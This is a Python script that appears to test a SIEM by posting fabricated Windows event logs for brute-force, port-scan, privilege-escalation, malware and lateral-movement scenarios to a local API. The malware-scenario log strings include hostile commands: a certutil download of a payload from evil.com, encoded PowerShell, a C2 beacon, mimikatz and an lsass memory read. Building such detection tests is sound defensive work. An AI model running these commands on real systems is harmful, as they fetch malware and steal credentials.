"""
Attack Simulator — sends realistic attack log sequences to the SIEM API.
Usage: python scripts/simulate_attack.py --attack brute_force --target http://localhost:8000
"""
import sys
import time
import random
import argparse
import requests
from datetime import datetime, timedelta
from colorama import Fore, Style, init

init(autoreset=True)

BASE_URL = "http://localhost:8000"
INGEST_URL = f"{BASE_URL}/api/logs/ingest/raw"

ATTACKER_IPS = ["185.220.101.45", "195.54.160.149", "45.142.212.100", "91.240.118.172"]
VICTIM_IPS = ["192.168.1.10", "192.168.1.20", "192.168.1.100"]
HOSTNAMES = ["WORKSTATION-01", "SERVER-DC01", "LAPTOP-HR-05", "SERVER-WEB01"]


def log(msg, color=Fore.WHITE):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {msg}{Style.RESET_ALL}")


def send_log(data: dict):
    try:
        r = requests.post(INGEST_URL, json=data, timeout=5)
        return r.status_code == 200
    except Exception as e:
        log(f"Send error: {e}", Fore.RED)
        return False


# ── Attack Scenarios ─────────────────────────────────────

def simulate_brute_force(attacker_ip=None, target_host=None, count=20):
    """Simulate brute force login attempts"""
    attacker_ip = attacker_ip or random.choice(ATTACKER_IPS)
    target_host = target_host or random.choice(HOSTNAMES)
    log(f"🔴 Simulating BRUTE FORCE from {attacker_ip} → {target_host}", Fore.RED)

    for i in range(count):
        data = {
            "source": "winlogbeat",
            "hostname": target_host,
            "source_ip": attacker_ip,
            "dest_ip": random.choice(VICTIM_IPS),
            "dest_port": random.choice([3389, 445, 22]),
            "event_id": random.choice([4625, 4771, 4776]),
            "log_level": "WARNING",
            "message": f"An account failed to log on. Account: Administrator. Failure Reason: %%2313",
            "winlog": {
                "event_id": 4625,
                "event_data": {
                    "IpAddress": attacker_ip,
                    "TargetUserName": "Administrator",
                    "LogonType": "3",
                    "FailureReason": "%%2313"
                }
            },
            "timestamp": (datetime.utcnow() - timedelta(seconds=count - i)).isoformat()
        }
        ok = send_log(data)
        log(f"  [{i+1}/{count}] Failed login attempt {'✓' if ok else '✗'}", Fore.YELLOW)
        time.sleep(0.1)

    log(f"✅ Brute force simulation complete ({count} attempts)", Fore.GREEN)


def simulate_port_scan(attacker_ip=None, target_host=None):
    """Simulate port scanning activity"""
    attacker_ip = attacker_ip or random.choice(ATTACKER_IPS)
    target_host = target_host or random.choice(HOSTNAMES)
    log(f"🟡 Simulating PORT SCAN from {attacker_ip}", Fore.YELLOW)

    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
             3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]

    for port in ports:
        data = {
            "source": "winlogbeat",
            "hostname": target_host,
            "source_ip": attacker_ip,
            "dest_ip": random.choice(VICTIM_IPS),
            "source_port": random.randint(40000, 65535),
            "dest_port": port,
            "event_id": 5157,
            "log_level": "INFO",
            "message": f"The Windows Filtering Platform has blocked a connection to port {port}",
        }
        ok = send_log(data)
        log(f"  Probing port {port:<6} {'✓' if ok else '✗'}", Fore.CYAN)
        time.sleep(0.05)

    log(f"✅ Port scan simulation complete ({len(ports)} ports)", Fore.GREEN)


def simulate_privilege_escalation(hostname=None):
    """Simulate privilege escalation events"""
    hostname = hostname or random.choice(HOSTNAMES)
    log(f"🔴 Simulating PRIVILEGE ESCALATION on {hostname}", Fore.RED)

    events = [
        (4720, "New user account created: svcadmin_tmp"),
        (4728, "Member added to Administrators group: svcadmin_tmp"),
        (4672, "Special privileges assigned to new logon: svcadmin_tmp"),
        (4624, "An account was successfully logged on — Type 10 (RemoteInteractive)"),
        (4688, "A new process has been created: mimikatz.exe"),
    ]

    for event_id, message in events:
        data = {
            "source": "winlogbeat",
            "hostname": hostname,
            "source_ip": None,
            "event_id": event_id,
            "log_level": "WARNING",
            "message": message,
        }
        ok = send_log(data)
        log(f"  Event {event_id}: {message[:50]} {'✓' if ok else '✗'}", Fore.MAGENTA)
        time.sleep(0.2)

    log("✅ Privilege escalation simulation complete", Fore.GREEN)


def simulate_malware(hostname=None):
    """Simulate malware activity"""
    hostname = hostname or random.choice(HOSTNAMES)
    attacker_ip = random.choice(ATTACKER_IPS)
    log(f"🔴 Simulating MALWARE on {hostname}", Fore.RED)

    events = [
        (4688, "New process: powershell.exe -enc JABjACAAPQAgAFsAUw...", "CRITICAL"),
        (4688, "New process: cmd.exe /c certutil.exe -urlcache -f http://evil.com/payload.exe", "CRITICAL"),
        (5156, f"Outbound connection to {attacker_ip}:4444 (C2 beacon)", "ERROR"),
        (4688, "New process: svchost.exe (unusual parent: cmd.exe)", "WARNING"),
        (4663, "Object access: lsass.exe memory read attempt", "CRITICAL"),
    ]

    for event_id, message, level in events:
        data = {
            "source": "winlogbeat",
            "hostname": hostname,
            "source_ip": attacker_ip,
            "event_id": event_id,
            "log_level": level,
            "message": message,
        }
        ok = send_log(data)
        log(f"  [{level}] {message[:60]} {'✓' if ok else '✗'}", Fore.RED)
        time.sleep(0.3)

    log("✅ Malware simulation complete", Fore.GREEN)


def simulate_lateral_movement():
    """Simulate lateral movement across hosts"""
    attacker_ip = random.choice(ATTACKER_IPS)
    log(f"🔴 Simulating LATERAL MOVEMENT", Fore.RED)

    for i, hostname in enumerate(HOSTNAMES[:3]):
        data = {
            "source": "winlogbeat",
            "hostname": hostname,
            "source_ip": attacker_ip,
            "dest_ip": VICTIM_IPS[i % len(VICTIM_IPS)],
            "dest_port": 445,
            "event_id": 4624,
            "log_level": "INFO",
            "message": f"Network logon (Type 3) from {attacker_ip}",
            "winlog": {
                "event_id": 4624,
                "event_data": {
                    "IpAddress": attacker_ip,
                    "LogonType": "3",
                    "TargetUserName": "SYSTEM"
                }
            }
        }
        ok = send_log(data)
        log(f"  Lateral move to {hostname} {'✓' if ok else '✗'}", Fore.MAGENTA)
        time.sleep(0.5)

    log("✅ Lateral movement simulation complete", Fore.GREEN)


def simulate_full_attack_chain():
    """Full kill-chain simulation"""
    log("🎯 Simulating FULL ATTACK CHAIN (APT scenario)", Fore.RED)
    log("Phase 1: Reconnaissance (Port Scan)", Fore.CYAN)
    simulate_port_scan()
    time.sleep(1)

    log("Phase 2: Initial Access (Brute Force)", Fore.YELLOW)
    simulate_brute_force(count=10)
    time.sleep(1)

    log("Phase 3: Privilege Escalation", Fore.MAGENTA)
    simulate_privilege_escalation()
    time.sleep(1)

    log("Phase 4: Malware Execution", Fore.RED)
    simulate_malware()
    time.sleep(1)

    log("Phase 5: Lateral Movement", Fore.RED)
    simulate_lateral_movement()

    log("\n🏁 Full attack chain complete! Check your SIEM dashboard.", Fore.GREEN)


# ── CLI ──────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SIEM Attack Simulator")
    parser.add_argument("--attack", choices=[
        "brute_force", "port_scan", "privilege_escalation",
        "malware", "lateral_movement", "full_chain", "all"
    ], default="full_chain")
    parser.add_argument("--target", default="http://localhost:8000")
    parser.add_argument("--count", type=int, default=20, help="Number of events for brute force")

    args = parser.parse_args()
    BASE_URL = args.target
    INGEST_URL = f"{BASE_URL}/api/logs/ingest/raw"

    log(f"🚀 SIEM Attack Simulator | Target: {BASE_URL}", Fore.CYAN)

    attacks = {
        "brute_force": lambda: simulate_brute_force(count=args.count),
        "port_scan": simulate_port_scan,
        "privilege_escalation": simulate_privilege_escalation,
        "malware": simulate_malware,
        "lateral_movement": simulate_lateral_movement,
        "full_chain": simulate_full_attack_chain,
    }

    if args.attack == "all":
        for name, fn in attacks.items():
            if name != "full_chain":
                fn()
                time.sleep(2)
    else:
        attacks[args.attack]()
